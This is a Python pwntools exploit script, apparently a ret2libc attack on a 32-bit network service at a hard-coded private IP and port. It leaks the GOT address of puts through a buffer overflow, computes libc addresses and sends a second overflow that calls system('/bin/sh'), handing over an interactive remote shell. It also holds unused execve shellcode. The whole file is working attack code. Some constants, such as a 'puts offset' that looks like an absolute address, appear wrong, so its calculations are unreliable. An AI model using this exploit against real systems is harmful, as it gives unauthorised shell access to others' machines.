from pwn import *
import json
import requests

# Target configuration
remote_ip = '192.168.1.138'
remote_port = 9000

# Static configuration based on binary analysis
buffer_size = 132
plt_puts = 0x8048340
plt_gets = 0x08048330
main_address = 0x804847b
got_puts = 0x80497ac
got_gets = 0x80497a8

# Offsets for the version of libc used by the target (example values, adjust for your target)
puts_offset = 0xb75f9cb0
system_offset = 0x3adb0
exit_offset = 0x2e9e0
bin_sh_offset = 0x15bb2b

# Example shellcode: execve("/bin/sh", NULL, NULL)
shellcode = b"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

def leak_address(target_ip, target_port, got_address):
    conn = remote(target_ip, target_port)
    
    # Create payload to leak address via puts
    payload = flat([
        b"A" * buffer_size,
        p32(plt_puts),
        p32(main_address),
        p32(got_address),
    ], word_size=32)

    conn.sendline(payload)

    # Skip lines to read the leaked address
    conn.recvlines(6)  # Adjust based on how many lines are before the leak
    leaked_address = u32(conn.recvn(4))
    conn.close()

    return leaked_address

def exploit(target_ip, target_port):
    # Leak the address of puts from the GOT to calculate libc base
    puts_leaked = leak_address(target_ip, target_port, got_puts)
    libc_base = puts_leaked - puts_offset

    # Calculate the addresses of system, exit, and "/bin/sh" within libc
    system_addr = libc_base + system_offset
    exit_addr = libc_base + exit_offset
    bin_sh_addr = libc_base + bin_sh_offset

    # Prepare the payload to spawn a shell using the system function
    payload = flat([
        b"B" * buffer_size,  # Adjust this size to match the overflow point
        p32(system_addr),
        p32(exit_addr),
        p32(bin_sh_addr),
    ], word_size=32)

    # Send the payload
    conn = remote(target_ip, target_port)
    conn.sendline(payload)

    # Hand over control to the user
    conn.interactive()

if __name__ == "__main__":
    exploit(remote_ip, remote_port)
